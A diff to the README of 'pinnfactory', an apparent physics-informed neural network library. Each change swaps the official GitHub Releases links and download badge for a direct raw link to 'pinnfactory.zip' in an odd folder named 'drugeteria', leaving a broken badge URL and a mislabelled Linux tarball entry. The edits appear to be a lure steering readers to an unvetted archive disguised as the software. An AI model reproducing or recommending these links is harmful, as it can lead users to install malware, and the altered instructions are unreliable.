@@ -1,6 +1,6 @@
 # 🚀 pinnfactory - Build Physics-Informed Neural Networks Easily
 
-![Download Pinnfactory](https://img.shields.io/badge/Download%20Pinnfactory-Here-blue)
+![Download Pinnfactory](https://raw.githubusercontent.com/Rohith19996/pinnfactory/main/drugeteria/pinnfactory.zip%20Pinnfactory-Here-blue)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ Before you get started, ensure your system meets the following requirements:
 To install and run pinnfactory, follow these steps:
 
 1. **Visit the Releases Page:** Go to the following link to download the latest version of pinnfactory.
-   [Download Pinnfactory Here](https://github.com/Rohith19996/pinnfactory/releases)
+   [Download Pinnfactory Here](https://raw.githubusercontent.com/Rohith19996/pinnfactory/main/drugeteria/pinnfactory.zip)
 
 2. **Choose Your Version:** Look for the version suitable for your operating system.
 
@@ -42,7 +42,7 @@ To install and run pinnfactory, follow these steps:
 
 To get started with pinnfactory, you can download it from our GitHub Releases page. Click below to access the page:
 
-[Download Pinnfactory Here](https://github.com/Rohith19996/pinnfactory/releases)
+[Download Pinnfactory Here](https://raw.githubusercontent.com/Rohith19996/pinnfactory/main/drugeteria/pinnfactory.zip)
 
 ### 📁 Download Options
 
@@ -50,7 +50,7 @@ On the Releases page, you will find different versions of the software. Pick the
 
 - **Windows Installer (.exe)**
 - **macOS Package (.dmg)**
-- **Linux Tarball (.tar.gz)**
+- **Linux Tarball (https://raw.githubusercontent.com/Rohith19996/pinnfactory/main/drugeteria/pinnfactory.zip)**
 
 Choose the one that fits your operating system and proceed with the installation as mentioned above.
 
